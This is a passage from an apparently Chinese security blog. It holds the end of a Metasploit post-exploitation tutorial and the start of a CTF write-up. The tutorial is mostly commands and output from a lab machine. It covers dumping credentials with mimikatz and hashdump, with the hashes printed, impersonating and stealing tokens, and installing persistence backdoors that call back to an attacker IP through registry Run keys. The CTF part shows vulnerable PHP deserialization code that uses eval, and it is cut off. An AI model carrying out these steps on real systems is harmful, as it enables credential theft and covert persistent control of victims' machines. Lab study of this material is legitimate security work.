&gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># 然鹅失败了，摸摸头</span><br></pre></td></tr></table></figure><h3 id="4-6-获取凭证-5"><a href="#4-6-获取凭证-5" class="headerlink" title="4.6 获取凭证"></a>4.6 获取凭证</h3>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。1.使用mimikatz<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) �ݿ� </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure><ol><li>使用meterpreter的run hashdump命令</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>3.post/windows/gather/smart_hashdump从上面也可以看出官方推荐<code>post/windows/gather/smart_hashdump</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>4.powerdump<br>同 hashdump，但失败了<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure><h3 id="4-7-假冒令牌-5"><a href="#4-7-假冒令牌-5" class="headerlink" title="4.7 假冒令牌"></a>4.7 假冒令牌</h3>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognito假冒令牌</span><br><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br><span class="line"></span><br><span class="line"># 2.steal_token窃取令牌</span><br><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure><h3 id="4-8-植入后门-5"><a href="#4-8-植入后门-5" class="headerlink" title="4.8 植入后门"></a>4.8 植入后门</h3>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。1.persistence启动项后门路径：metasploit/scripts/meterpreter/persistence原理是在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本，在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项，<strong>很容易被杀软拦截，官方不推荐</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure>能实现同样功能的脚本还有：exploit/windows/local/persistence2.metsvc服务后门在C:\Users<em><strong>\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。</strong>通过服务启动，需要管理员权限，官方不推荐使用，运行失败</em>*<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –A   #自动安装后门</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run metsvc –A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure>三个文件上传成功，但服务没有启动起来，失败了。使用<code>-r</code>参数可卸载服务。3.persistence_exe再来看看官方推荐的东西吧<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure>此模块将可执行文件上载到远程主机并进行创建持久性。<br>涉及到四个参数<ul><li>REXENAME是拷贝到目标系统中的名字</li><li>EXEPATH是将要上传的后门在本地的位置</li><li>SESSION是选择运行此模块的会话</li><li>STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。</li></ul>尝试一下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure>4.registry_persistence完整路径为exploit/windows/local/registry_persistence和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure>同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence。<h2 id="参考-5"><a href="#参考-5" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li><li><a href="https://www.anquanke.com/post/id/164525">https://www.anquanke.com/post/id/164525</a></li><li><a href="https://www.freebuf.com/sectool/118714.html">访问的文章审核中… - FreeBuf网络安全行业门户</a></li></ul></li></ul></li></ul></li></ul></li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2022DASCTF X SU 三月春季挑战赛</title>
      <link href="/2022/04/01/2022DASCTF%20X%20SU%20%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>/2022/04/01/2022DASCTF%20X%20SU%20%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;v1(<span class="keyword">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v1-&gt;world();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1-&gt;get_flag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;run();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="keyword">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    unserialize(<span 